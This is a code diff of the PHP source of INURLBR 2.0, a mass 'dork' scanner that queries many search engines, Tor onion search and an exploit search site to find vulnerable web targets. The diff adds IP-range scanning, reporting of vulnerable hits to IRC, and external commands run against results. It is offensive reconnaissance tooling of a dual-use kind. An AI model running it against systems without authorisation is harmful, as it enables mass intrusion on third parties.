+        __pageEngine($confArray, "ZOO", "http://www.zoo.com/Zoo-Site/search/web?qsi=[PAG2]&q=[DORK]&p=[PAG]&fcoid=4&fpid=2", $dork_, $postDados, 1, 211, 20, 10);
+    }
 
 ################################################################################
 # SEARCH ENGINE :::  www.hotbot.com
 ################################################################################
-if (__validateOptions($_SESSION["config"]["motor"], 17) || __validateOptions($_SESSION["config"]["motor"], "all")) {
 
-$_SESSION["config"]["idPesquisaLycos"] = __getIdSearchLycos(__request_info($curlObject_id = curl_init(), "http://www.hotbot.com/", $_SESSION["config"]["proxy"], $postDados)["corpo"]);
-__pageEngine($confArray, "HOTBOT", "http://www.hotbot.com/search/web?pn=[PAG]web?q=[DORK]&keyvol={$_SESSION["config"]["idPesquisaLycos"]}",$dork_,$postDados, 0, 24, 1);
-}
+    if (__validateOptions($_SESSION["config"]["motor"], 17) || __validateOptions($_SESSION["config"]["motor"], "all")) {
+        $_ = __request_info("http://www.hotbot.com/", $_SESSION["config"]["proxy"], $postDados);
+        $_SESSION["config"]["idPesquisaLycos"] = __getIdSearchLycos($_["corpo"]);
+        __pageEngine($confArray, "HOTBOT", "http://www.hotbot.com/search/web?pn=[PAG]web?q=[DORK]&keyvol={$_SESSION["config"]["idPesquisaLycos"]}", $dork_, $postDados, 0, 24, 1);
+    }
 
 ################################################################################
 # SEARCH ENGINE :::  www.zhongsou.com
 ################################################################################
-if (__validateOptions($_SESSION["config"]["motor"], 18) || __validateOptions($_SESSION["config"]["motor"], "all")) {
 
-__pageEngine($confArray, "ZHONGSOU", "http://www.zhongsou.com/third?w=[DORK]&b=[PAG]",$dork_,$postDados, 1, 50, 1);
-}
+    if (__validateOptions($_SESSION["config"]["motor"], 18) || __validateOptions($_SESSION["config"]["motor"], "all")) {
+
+        __pageEngine($confArray, "ZHONGSOU", "http://www.zhongsou.com/third?w=[DORK]&b=[PAG]", $dork_, $postDados, 1, 50, 1);
+    }
 
 ################################################################################
 # SEARCH ENGINE :::  hksearch.timway.com
 ################################################################################
-if (__validateOptions($_SESSION["config"]["motor"], 19) || __validateOptions($_SESSION["config"]["motor"], "all")) {
+    if (__validateOptions($_SESSION["config"]["motor"], 19) || __validateOptions($_SESSION["config"]["motor"], "all")) {
 
-__pageEngine($confArray, "HKSEARCH", "http://hksearch.timway.com/search.php?query=[DORK]&region=zh-hant-hk&p=[PAG]",$dork_,$postDados, 1, 12, 1);
-}
+        __pageEngine($confArray, "HKSEARCH", "http://hksearch.timway.com/search.php?query=[DORK]&region=zh-hant-hk&p=[PAG]", $dork_, $postDados, 1, 12, 1);
+    }
 
 ################################################################################
 # SEARCH ENGINE :::  find.ezilon.com / USA
 ################################################################################
-if (__validateOptions($_SESSION["config"]["motor"], 20) || __validateOptions($_SESSION["config"]["motor"], "all")) {
 
-__pageEngine($confArray, "EZILION USA", "http://find.ezilon.com/search.php?q=[DORK]&start=[PAG]&t=&v=usa&f=",$dork_,$postDados, 0, 215, 15);
-}
+    if (__validateOptions($_SESSION["config"]["motor"], 20) || __validateOptions($_SESSION["config"]["motor"], "all")) {
+
+        __pageEngine($confArray, "EZILION USA", "http://find.ezilon.com/search.php?q=[DORK]&start=[PAG]&t=&v=usa&f=", $dork_, $postDados, 0, 215, 15);
+    }
 
 ################################################################################
 # SEARCH ENGINE :::  find.ezilon.com / ASIA
 ################################################################################
-if (__validateOptions($_SESSION["config"]["motor"], 20) || __validateOptions($_SESSION["config"]["motor"], "all")) {
 
-__pageEngine($confArray, "EZILION ASIA", "http://find.ezilon.com/search.php?q=[DORK]&start=[PAG]&t=&v=asia&f=",$dork_,$postDados, 0, 215, 15);
-}
+    if (__validateOptions($_SESSION["config"]["motor"], 20) || __validateOptions($_SESSION["config"]["motor"], "all")) {
+
+        __pageEngine($confArray, "EZILION ASIA", "http://find.ezilon.com/search.php?q=[DORK]&start=[PAG]&t=&v=asia&f=", $dork_, $postDados, 0, 215, 15);
+    }
 
 ################################################################################
 # SEARCH ENGINE :::  find.ezilon.com / EUROPA
 ################################################################################
-if (__validateOptions($_SESSION["config"]["motor"], 20) || __validateOptions($_SESSION["config"]["motor"], "all")) {
 
-__pageEngine($confArray, "EZILION EUROPA", "http://find.ezilon.com/search.php?q=[DORK]&start=[PAG]&t=&v=eu&f=",$dork_,$postDados, 0, 215, 15);
-}
+    if (__validateOptions($_SESSION["config"]["motor"], 20) || __validateOptions($_SESSION["config"]["motor"], "all")) {
+
+        __pageEngine($confArray, "EZILION EUROPA", "http://find.ezilon.com/search.php?q=[DORK]&start=[PAG]&t=&v=eu&f=", $dork_, $postDados, 0, 215, 15);
+    }
 
 ################################################################################
 # SEARCH ENGINE :::  find.ezilon.com / INDIA
 ################################################################################
-if (__validateOptions($_SESSION["config"]["motor"], 20) || __validateOptions($_SESSION["config"]["motor"], "all")) {
+    if (__validateOptions($_SESSION["config"]["motor"], 20) || __validateOptions($_SESSION["config"]["motor"], "all")) {
 
-__pageEngine($confArray, "EZILION INDIA", "http://find.ezilon.com/search.php?q=[DORK]&start=[PAG]&t=&v=in&f=",$dork_,$postDados, 0, 215, 15);
-}
+        __pageEngine($confArray, "EZILION INDIA", "http://find.ezilon.com/search.php?q=[DORK]&start=[PAG]&t=&v=in&f=", $dork_, $postDados, 0, 215, 15);
+    }
 
 ################################################################################
 # SEARCH ENGINE :::  www.sogou.com
 ################################################################################
-if (__validateOptions($_SESSION["config"]["motor"], 21) || __validateOptions($_SESSION["config"]["motor"], "all")) {
 
-__pageEngine($confArray, "SOGOU", "http://www.sogou.com/web?query=[DORK]&page=[pag]&ie=utf8",$dork_,$postDados, 1, 20, 1);
-}
+    if (__validateOptions($_SESSION["config"]["motor"], 21) || __validateOptions($_SESSION["config"]["motor"], "all")) {
+
+        __pageEngine($confArray, "SOGOU", "http://www.sogou.com/web?query=[DORK]&page=[pag]&ie=utf8", $dork_, $postDados, 1, 20, 1);
+    }
 
 ################################################################################
 # SEARCH ENGINE :::  api.duckduckgo.com
 ################################################################################
-if (__validateOptions($_SESSION["config"]["motor"], "22") || __validateOptions($_SESSION["config"]["motor"], "all")) {
 
-$postDados = TRUE;
-__pageEngine($confArray, "DUCK DUCK GO", "https://api.duckduckgo.com/html/?q=[DORK]&kl=en-us&p=-1&s=[PAG]&dc=[PAG3]&o=json&api=d.js",$dork_,$postDados, 0, 800, 50, 0, 37);
-}
+    if (__validateOptions($_SESSION["config"]["motor"], 22) || __validateOptions($_SESSION["config"]["motor"], "all")) {
+
+        $postDados = TRUE;
+        __pageEngine($confArray, "DUCK DUCK GO", "https://api.duckduckgo.com/html/?q=[DORK]&kl=en-us&p=-1&s=[PAG]&dc=[PAG3]&o=json&api=d.js", $dork_, $postDados, 0, 800, 50, 0, 37);
+    }
 
 ################################################################################
 # SEARCH ENGINE :::  boorow
 ################################################################################
-if (__validateOptions($_SESSION["config"]["motor"], "23") || __validateOptions($_SESSION["config"]["motor"], "all")) {
 
-$postDados = TRUE;
-__pageEngine($confArray, "BOOROW", "http://boorow.com/Pages/site_br_aspx?query=[DORK]",$dork_,$postDados, 0, 0, 1);
-}
+    if (__validateOptions($_SESSION["config"]["motor"], 23) || __validateOptions($_SESSION["config"]["motor"], "all")) {
+
+        $postDados = TRUE;
+        __pageEngine($confArray, "BOOROW", "http://boorow.com/Pages/site_br_aspx?query=[DORK]", $dork_, $postDados, 0, 0, 1);
+    }
 
 ################################################################################
 # SEARCH ENGINE ::: Google Generic RANDOM
 ################################################################################
-if (__validateOptions($_SESSION["config"]["motor"], "24") || __validateOptions($_SESSION["config"]["motor"], 1) ||  __validateOptions($_SESSION["config"]["motor"], "all")) {
 
-$randHost = __dominioGoogleRandom();
-$randGeneric = __googleGenericRandom();
-__pageEngine($confArray, "GOOGLE_GENERIC_RANDOM - {$randHost} ID: {$randGeneric}", "http://{$randHost}/cse?cx={$randGeneric}&q=[DORK]&num=500&hl=en&as_qdr=all&start=[PAG]&sa=N",$dork_,$postDados, 0, 5, 1);
+    if (__validateOptions($_SESSION["config"]["motor"], 24) || __validateOptions($_SESSION["config"]["motor"], 1) || __validateOptions($_SESSION["config"]["motor"], "all")) {
 
-}
+        $randHost = __dominioGoogleRandom();
+        $randGeneric = __googleGenericRandom();
+        __pageEngine($confArray, "GOOGLE_GENERIC_RANDOM - {$randHost} ID: {$randGeneric}", "http://{$randHost}/cse?cx={$randGeneric}&q=[DORK]&num=500&hl=en&as_qdr=all&start=[PAG]&sa=N", $dork_, $postDados, 0, 5, 1);
+    }
 
 
 #===============================================================================
@@ -2326,87 +3546,123 @@ __pageEngine($confArray, "GOOGLE_GENERIC_RANDOM - {$randHost} ID: {$randGeneric}
 #===============================================================================
 #===============================================================================
 #===============================================================================
+#===============================================================================
+# SEARCH ENGINE :::  ndj6p3asftxboa7j.tor2web.org / Tor find ===================
+#===============================================================================
+
+    if (__validateOptions($_SESSION["config"]["motor"], "e1")) {
+
+        __pageEngine("TOR FIND", "https://ndj6p3asftxboa7j.tor2web.org/search.php?search_query=[DORK]&page_num=[PAG]&domainchoice=onion", $dork_, $postDados, 1, 5, 1);
+    }
 
 #===============================================================================
-# SEARCH ENGINE :::  ndj6p3asftxboa7j.tor2web.org / Tor find
+# SEARCH ENGINE :::  elephantjmjqepsw.tor2web.org ==============================
 #===============================================================================
-if (__validateOptions($_SESSION["config"]["motor"], "e1")) {
 
-__pageEngine("TOR FIND", "https://ndj6p3asftxboa7j.tor2web.org/search.php?search_query=[DORK]&page_num=[PAG]&domainchoice=onion",$dork_,$postDados, 1, 5, 1);
+    if (__validateOptions($_SESSION["config"]["motor"], "e2")) {
+
+        __pageEngine("ELEPHANT", "https://elephantjmjqepsw.tor2web.orgsearch?q=[DORK]&page=[PAG]", $dork_, $postDados, 0, 29, 1);
+    }
+
+#===============================================================================
+# SEARCH ENGINE :::  kbhpodhnfxl3clb4.tor2web.org ==============================
+#===============================================================================
+
+    if (__validateOptions($_SESSION["config"]["motor"], "e3")) {
+
+        __pageEngine("TORSEARCH", "https://kbhpodhnfxl3clb4.tor2web.org/en/search?j=f&page=[PAG]&q=[DORK]&utf8=%E2%9C%93", $dork_, $postDados, 0, 10, 1);
+    }
+
+#===============================================================================
+# SEARCH ENGINE :::  search.wikileaks.org ======================================
+#===============================================================================
+
+    if (__validateOptions($_SESSION["config"]["motor"], "e4")) {
+
+        __pageEngine("WIKILEAKS", "https://search.wikileaks.org/?page=[PAG]&q=[DORK]&sort=0#results", $dork_, $postDados, 1, 60, 1);
+    }
+
+#===============================================================================
+# SEARCH ENGINE ::: oth.net ====================================================
+#===============================================================================
+
+    if (__validateOptions($_SESSION["config"]["motor"], "e5")) {
+
+        __pageEngine("OTN", "http://oth.net/s/s?q=[DORK]&cl=1&skip=[PAG]", $dork_, $postDados, 1, 211, 20);
+    }
+
+#===============================================================================
+# SEARCH ENGINE ::: exploits.shodan.io =========================================
+#===============================================================================
+
+    if (__validateOptions($_SESSION["config"]["motor"], "e6")) {
+
+        __pageEngine("EXPLOITS SHODAN", "https://exploits.shodan.io/?q=[DORK]&p=[PAG]", $dork_, $postDados, 1, 25, 1);
+    }
+
+    __plus();
 }
-
-#===============================================================================
-# SEARCH ENGINE :::  elephantjmjqepsw.tor2web.org
-#===============================================================================
-if (__validateOptions($_SESSION["config"]["motor"], "e2")) {
-
-__pageEngine("ELEPHANT", "https://elephantjmjqepsw.tor2web.orgsearch?q=[DORK]&page=[PAG]",$dork_,$postDados, 0, 29, 1);
-}
-
-#===============================================================================
-# SEARCH ENGINE :::  kbhpodhnfxl3clb4.tor2web.org
-#===============================================================================
-if (__validateOptions($_SESSION["config"]["motor"], "e3")) {
-
-__pageEngine("TORSEARCH", "https://kbhpodhnfxl3clb4.tor2web.org/en/search?j=f&page=[PAG]&q=[DORK]&utf8=%E2%9C%93",$dork_,$postDados, 0, 10, 1);
-}
-
-#===============================================================================
-# SEARCH ENGINE :::  search.wikileaks.org
-#===============================================================================
-if (__validateOptions($_SESSION["config"]["motor"], "e4")) {
-
-__pageEngine("WIKILEAKS", "https://search.wikileaks.org/?page=[PAG]&q=[DORK]&sort=0#results",$dork_,$postDados, 1, 60, 1);
-}
-
-#===============================================================================
-# SEARCH ENGINE ::: oth.net
-#===============================================================================
-if (__validateOptions($_SESSION["config"]["motor"], "e5")) {
-
-__pageEngine("OTN", "http://oth.net/s/s?q=[DORK]&cl=1&skip=[PAG]",$dork_,$postDados, 1, 211, 20);
-}
-
-#===============================================================================
-# SEARCH ENGINE ::: exploits.shodan.io
-#===============================================================================
-if (__validateOptions($_SESSION["config"]["motor"], "e6")) {
-
-__pageEngine("EXPLOITS SHODAN", "https://exploits.shodan.io/?q=[DORK]&p=[PAG]",$dork_,$postDados, 1, 25, 1);
-}
-
-
-__plus(); ';
 
 ################################################################################
 #INITIAL INFORMATION############################################################
+################################################################################
 
 function __startingBanner() {
 
     echo "\n{$_SESSION["c1"]}[ ! ] Starting SCANNER INURLBR 2.0 at [" . date("d-m-Y H:i:s") . "]{$_SESSION["c9"]}
-[!] legal disclaimer: Usage of INURLBR for attacking targets without prior mutual consent is illegal. 
+[ ! ] legal disclaimer: Usage of INURLBR for attacking targets without prior mutual consent is illegal. 
 It is the end user's responsibility to obey all applicable local, state and federal laws.
 Developers assume no liability and are not responsible for any misuse or damage caused by this program{$_SESSION["c0"]}\n";
 
     $file = not_isnull_empty($_SESSION['config']['arquivo_output']) ? $_SESSION['config']['arquivo_output'] : NULL;
     $file_all = not_isnull_empty($_SESSION['config']['arquivo_output_all']) ? $_SESSION['config']['arquivo_output_all'] : NULL;
     $command = not_isnull_empty($_SESSION['config']['command-vul']) ? $_SESSION['config']['command-vul'] : $_SESSION['config']['command-all'];
+    $subcommand = not_isnull_empty($_SESSION['config']['sub-cmd-vul']) ? $_SESSION['config']['sub-cmd-vul'] : $_SESSION['config']['sub-cmd-all'];
 
-    echo (not_isnull_empty($_SESSION['config']['ifurl']) ? "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ FILTRE URL ]::{$_SESSION["c1"]}[ {$_SESSION['config']['ifurl']} ]{$_SESSION["c0"]}" : NULL);
-    echo (not_isnull_empty($file) ? "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ OUTPUT FILE ]::{$_SESSION["c1"]} [ " . getcwd() . "/{$_SESSION['config']['out_put_paste']}{$file}  ]{$_SESSION["c0"]}" : NULL);
-    echo (not_isnull_empty($file_all) ? "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ OUTPUT FILE ALL ]::{$_SESSION["c1"]}[ " . getcwd() . "/{$_SESSION['config']['out_put_paste']}{$file_all}  ]{$_SESSION["c0"]}" : NULL);
-    echo (not_isnull_empty($command) ? "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ DEFINED EXTERNAL COMMAND ]::{$_SESSION["c1"]} [ $command ]{$_SESSION["c0"]}" : NULL);
-    echo (not_isnull_empty($_SESSION['config']['proxy-file']) ? "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ FILE SOURCE LIST OF PROXY ]::{$_SESSION["c1"]} [ {$_SESSION['config']['proxy-file']} ]{$_SESSION["c0"]}" : NULL);
+    echo (not_isnull_empty($_SESSION['config']['ifemail']) ?
+            "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ FILTER EMAIL ]::{$_SESSION["c1"]}[ {$_SESSION['config']['ifemail']} ]{$_SESSION["c0"]}" : NULL);
+
+    echo (is_array($_SESSION['config']['dork-file']) ?
+            "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ DORK FILE ]::{$_SESSION["c1"]}[ {$_SESSION['config']['dork-file']} ]{$_SESSION["c0"]}" : NULL);
+
+    echo (not_isnull_empty($_SESSION['config']['dork-rand']) ?
+            "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ DORKS GENERATED ]::{$_SESSION["c1"]}[ {$_SESSION['config']['dork-rand']} ]{$_SESSION["c0"]}" : NULL);
+
+    echo (is_array($_SESSION['config']['irc']['conf']) ?
+            "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ SEND VULN IRC ]::{$_SESSION["c1"]}[ server: {$_SESSION['config']['irc']['conf'][0]} / channel: {$_SESSION['config']['irc']['conf'][1]} ]{$_SESSION["c0"]}" : NULL);
+
+    echo (not_isnull_empty($_SESSION['config']['ifurl']) ?
+            "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ FILTER URL ]::{$_SESSION["c1"]}[ {$_SESSION['config']['ifurl']} ]{$_SESSION["c0"]}" : NULL);
+
+    echo (not_isnull_empty($file) ?
+            "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ OUTPUT FILE ]::{$_SESSION["c1"]} [ " . getcwd() . "/{$_SESSION['config']['out_put_paste']}{$file}  ]{$_SESSION["c0"]}" : NULL);
+
+    echo (not_isnull_empty($file_all) ?
+            "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ OUTPUT FILE ALL ]::{$_SESSION["c1"]}[ " . getcwd() . "/{$_SESSION['config']['out_put_paste']}{$file_all}  ]{$_SESSION["c0"]}" : NULL);
+
+    echo (not_isnull_empty($command) ?
+            "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ DEFINED EXTERNAL COMMAND ]::{$_SESSION["c1"]} [ $command ]{$_SESSION["c0"]}" : NULL);
+
+    echo (not_isnull_empty($subcommand) ?
+            "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ DEFINED EXTERNAL SUB_COMMAND ]::{$_SESSION["c1"]} [ $subcommand ]{$_SESSION["c0"]}" : NULL);
+
+    echo (not_isnull_empty($_SESSION['config']['proxy-file']) ?
+            "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ FILE SOURCE LIST OF PROXY ]::{$_SESSION["c1"]} [ {$_SESSION['config']['proxy-file']} ]{$_SESSION["c0"]}" : NULL);
 }
 
 ################################################################################
 #RUN WITH SEARCH ENGINES########################################################
+################################################################################
+# (PHP 4 >= 4.0.1, PHP 5) create_function — Create an anonymous (lambda-style) 
+# function http://php.net/manual/en/function.create-function.php
 
 function __main($dork, $motor, $cod) {
 
-    $dork_ = (strstr($dork, '[DORK]') ? explode('[DORK]', $dork) : array($dork)); // MULTIPLAS DORKS
-    $file_dork = (not_isnull_empty($_SESSION['config']['dork-file']) ? __openFile($_SESSION['config']['dork-file'], 1) : $dork_);
-    $dork__ = array_filter(array_unique(array_merge($file_dork, $dork_)));
+    $dork_[0] = (strstr($dork, '[DORK]') ? explode('[DORK]', $dork) : array($dork));
+    $dork_[1] = (not_isnull_empty($_SESSION['config']['dork-file']) ? __openFile($_SESSION['config']['dork-file'], 1) : $dork_[0]);
+    $dork_[2] = (not_isnull_empty($_SESSION['config']['dork-rand']) ? __randomDork($_SESSION['config']['dork-rand']) : array());
+    $dork_[3] = array_filter(array_unique(array_merge($dork_[0], $dork_[1], $dork_[2])));
+
     $file_proxy = (not_isnull_empty($_SESSION['config']['proxy-file']) ? __openFile($_SESSION['config']['proxy-file'], 1) : NULL);
     $list_proxy = (is_array($file_proxy) ? ($file_proxy) : NULL);
 
@@ -2414,27 +3670,47 @@ function __main($dork, $motor, $cod) {
 
     __startingBanner();
 
-    for ($i = 0; $i <= count($dork__); $i++) {
+    for ($i = 0; $i <= count($dork_[3]); $i++) {
 
-        if (!empty($dork__[$i])) {
+        if (!empty($dork_[3][$i])) {
 
-            echo "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}[ DORK ]::{$_SESSION["c1"]}[ {$dork__[$i]} ]\n";
+            echo "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}[ DORK ]::{$_SESSION["c1"]}[ {$dork_[3][$i]} ]\n";
 
-            $objNewSearch = create_function('$dork__, $motor, $list_proxy', $cod);
-            $objNewSearch(urlencode($dork__[$i]), $motor, $list_proxy);
+            //$objNewSearch = create_function('$dork_, $motor, $list_proxy', $cod);
+            //$objNewSearch(urlencode($dork_[3][$i]), $motor, $list_proxy);
 
-            __plus();
+            __engines(str_replace(' ', '%20', $dork_[3][$i]), $list_proxy) . __plus();
+
+            ($_SESSION["config"]["pr"]) ? __process(explode("\n", $_SESSION["config"]["totas_urls"])) . __plus() : NULL;
+            ($_SESSION["config"]["pr"]) ? $_SESSION["config"]["totas_urls"] = NULL : NULL;
+
             echo "\n";
         }
     }
 
-    __process(explode("\n", $_SESSION["config"]["totas_urls"])) . __plus();
+    (!$_SESSION["config"]["pr"]) ? __process(explode("\n", $_SESSION["config"]["totas_urls"])) . __plus() : NULL;
 
     __exitProcess();
 }
 
 ################################################################################
+#RUN VALIDATION / PROCESSES SCAN RANG IP########################################
+################################################################################
+
+if (not_isnull_empty($_SESSION['config']['range']) || not_isnull_empty($_SESSION['config']['range-rand'])) {
+
+    print __bannerLogo();
+    __startingBanner();
+    not_isnull_empty($_SESSION['config']['range']) ? __process(__generatorRangeIP($_SESSION['config']['range'])) : NULL;
+    not_isnull_empty($_SESSION['config']['range-rand']) ? __process(__generatorIPRandom(array(1 => $_SESSION['config']['range-rand']))) : NULL;
+    __exitProcess();
+}
+
+
+################################################################################
 #RUN VALIDATION / PROCESSES WITH FILE###########################################
+################################################################################
+
 if (not_isnull_empty($_SESSION['config']['abrir-arquivo'])) {
 
     print __bannerLogo();
@@ -2446,6 +3722,8 @@ if (not_isnull_empty($_SESSION['config']['abrir-arquivo'])) {
 
 ################################################################################
 #RUN WITH SEARCH ENGINES########################################################
+################################################################################
+
 __main($_SESSION['config']['dork'], $_SESSION['config']['motor'], $_SESSION['config']['cod']);
 
 function __extra() {
@@ -2554,7 +3832,21 @@ ________________[_]_[_]_[_]________/_]_[_\_________________________
   /  /_\  \   |  . `  |     |  |     |  | |   __|  /  /_\  \   
  /  _____  \  |  |\   |     |  |     |  | |  |    /  _____  \  
 /__/     \__\ |__| \__|     |__|     |__| |__|   /__/     \__\                                                              
-");
+", "{$_SESSION["c1"]}
+ _____       _                       _           
+/  ___|     | |                     (_)          
+\ `--. _   _| |____   _____ _ __ ___ ___   _____ 
+ `--. \ | | | '_ \ \ / / _ \ '__/ __| \ \ / / _ \
+/\__/ / |_| | |_) \ V /  __/ |  \__ \ |\ V /  __/
+\____/ \__,_|_.__/ \_/ \___|_|  |___/_| \_/ \___|
 
+", "{$_SESSION["c1"]}
+ __     __              _       _ _                       ____  _       _ _        _ 
+ \ \   / /_ _ _ __   __| | __ _| (_)___ _ __ ___   ___   |  _ \(_) __ _(_) |_ __ _| |
+  \ \ / / _` | '_ \ / _` |/ _` | | / __| '_ ` _ \ / _ \  | | | | |/ _` | | __/ _` | |
+   \ V / (_| | | | | (_| | (_| | | \__ \ | | | | | (_) | | |_| | | (_| | | || (_| | |
+    \_/ \__,_|_| |_|\__,_|\__,_|_|_|___/_| |_| |_|\___/  |____/|_|\__, |_|\__\__,_|_|
+                                                                  |___/              
+");
     return ($banners[rand(0, count($banners) - 1)]);
 }
